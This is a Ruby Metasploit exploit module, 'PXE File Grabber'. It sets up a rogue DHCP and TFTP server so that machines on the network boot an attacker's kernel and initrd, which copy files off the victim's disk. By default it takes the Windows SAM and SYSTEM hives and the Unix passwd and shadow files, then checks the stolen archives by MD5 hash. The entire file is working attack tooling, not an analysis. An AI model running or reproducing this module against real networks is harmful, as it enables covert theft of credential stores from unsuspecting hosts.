##
# This module requires Metasploit: http//metasploit.com/download
# Current source: On my virtualmachine ;)
##

require 'msf/core'
require 'rex/proto/tftp'
require 'rex/proto/dhcp'
require 'tmpdir'
require 'thread'
require 'digest/md5'

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::TFTPServer
  include Msf::Auxiliary::Report
  
  def initialize
    super(
      'Name'        => 'PXE File Grabber',
      'Description'    => %q{
        This module provides a PXE server, running a DHCP and TFTP server.
        The default configuration loads a linux kernel and initrd into the memory of the target
        that reads the hard drive and copies the files from FILES variable to the TFTPROOT.

        Note: the displayed IP address of a target is the address this DHCP server
        handed out, not the "normal" IP address the host uses.
      },
      'Author'      => [ 'Bram Stienstra / Bob Verveer' ],
      'License'     => MSF_LICENSE,
      'DefaultOptions' =>
        {
          'EXITFUNC' => 'thread',
	  'DisablePayloadHandler' => 'true'
        },
      'Payload'        =>
        {
          'Space'       => 450,
          'DisableNops' => 'False',
        },
      'Platform'       => %w{ unix win },
      'Targets'        =>
        [
          [ 'Default',
            {
            }
          ],
        ],
      'DefaultTarget'  => 0,
      'DisclosureDate' => 'Okt 31 2015',
      'Privileged'     => true,
      'Stance' => Msf::Exploit::Stance::Passive
    )

    register_options(
      [
        OptInt.new('SESSION',   [ false,  'A session to pivot the attack through' ]),
        OptString.new('TFTPROOT',   [ false,  'The TFTP root directory to serve files from' ] ),
        OptPath.new('OUTPUTPATH', [ true, "The directory in which uploaded files will be written.", Dir.tmpdir ]),
        OptString.new('SRVHOST',   [ true,  'The IP of the DHCP server' ]),
	OptString.new('FILES', [ false,	'Default to SAM/SYSTEM. Comma separated', 'SAM,SYSTEM,passwd,shadow' ])

      ], self.class)

    register_advanced_options(
      [
        OptString.new('NETMASK',   [ false,  'The netmask of the local subnet', '255.255.255.0' ]),
        OptString.new('DHCPIPSTART',   [ false,  'The first IP to give out' ]),
        OptString.new('DHCPIPEND',   [ false,  'The last IP to give out' ])
      ], self.class)

  end

  def exploit
    if not datastore['TFTPROOT']
    datastore['TFTPROOT'] = File.join(Msf::Config.data_directory, 'exploits', 'pxexploit')
    end
    datastore['FILENAME'] = "update1"

    open(File.join(datastore['TFTPROOT'],'grabs.txt'),'w+') { |f|
       f.puts datastore['FILES'].split(",")
    }

    # Prepare payload
    print_status("Creating initrd")
    kernel = IO.read(File.join(Msf::Config.data_directory, 'exploits', 'pxexploit', 'pxegrabber', 'kernel'))
    initrd = IO.read(File.join(Msf::Config.data_directory, 'exploits', 'pxexploit', 'pxegrabber', 'initrd'))

	
    # normal attack
    print_status("Starting TFTP server...")
    @tftp = Rex::Proto::TFTP::Server.new
    @tftp.set_tftproot(datastore['TFTPROOT'])
    @tftp.set_output_dir(datastore['OUTPUTPATH'])
    @tftp.register_file('update3', kernel)
    @tftp.register_file('update4', initrd)
    @tftp.start

    @tftpfilehandler = Tftpfilehandler.new(datastore['OUTPUTPATH'])
    @tftpfilehandler.start

    print_status("Starting DHCP server...")
    @dhcp = Rex::Proto::DHCP::Server.new( datastore )
    @dhcp.report do |mac, ip|
      print_status("Serving PXE attack to #{mac.unpack('H2H2H2H2H2H2').join(':')} "+
          "(#{Rex::Socket.addr_ntoa(ip)})")
      report_note({
        :type => 'PXE.client',
        :data => mac.unpack('H2H2H2H2H2H2').join(':')
      })

    end
    @dhcp.start
    print_status("pxesploit attack started")

    # Wait for finish..
    @tftp.thread.join
    @dhcp.thread.join
    print_status("pxesploit attack completed")
  end
end

class Tftpfilehandler
  
  # Initialize Tftpfilehandler
  
  def initialize(path)
    @shutting_down = false
    @path = path
    @allFiles = []
    @procFiles = []
  end

  # Start the TFTP FileHandler
  def start
    @thread = Rex::ThreadFactory.spawn("TFTPFileHandler", false){
      handle_files
    }
  end

  # Stop the TFTP FileHandler
  def stop
    @shutting_down = true
    @thread.kill
  end

  # See if there is anything to do.. If so, handle it.
  def handle_files
    puts("Searching for uploaded files")
    while not @shutting_down do
      sleep(10)
      find_files
      check_file
    end
  end

  # Search for files with .md5 extension
  def find_files
    Dir.glob(@path + '/*.md5').each do |file|
      #Add file to allFiles, unless it already is.
      @allFiles.push(file) unless @allFiles.include?(file)
    end
  end
  
  def check_file
    # Check if any files have been added
    if @allFiles.size > 0
	  # For each file in @allFiles
      @allFiles.each do |file|
	    # If it's not already processed (in @procFiles)
        if not @procFiles.include?(file)
		  # Store the filepath in orgFileString
          orgFileString = file
		  # Change extension to .tar.gz
          newFileString = orgFileString.split(".md5").first + ".tar.gz"
		  # Check if .md5 file has corresponding .tar.gz file
          if File.file?(newFileString)
		    # Check the md5 hash
            checkMD5(orgFileString, newFileString)
            # Push handled file so this doesn't get processed again
            @procFiles.push(orgFileString)
		  else
		    puts("Strange there seems to be no corresponding file for: " + orgFileString)
          end
        end
      end
    end
  end

  def checkMD5(md5file, tarfile)
    puts("Found file: " + md5file + " and: " + tarfile)
    puts("Checking if hashes match...")
    
    #Read the md5 hash from file .md5
    md5content = File.read(md5file)
    md5hash = md5content.split(" ").first
    puts("Hash read from: " + md5file + " is: " + md5hash)
	
    #Calculate the md5sum over tarfile
    digest = Digest::MD5.hexdigest(File.read(tarfile))
    puts("Hash calculated from: " + tarfile + " is: " + digest)
    
    #Compare result
    if md5hash == digest
      puts("Hashes for file: " + tarfile + " match, file was succesfully transferred via TFTP!")
    else
      puts("Hashes for file: " + tarfile + " do not match, file may be corrupted.")
    end
  end

end
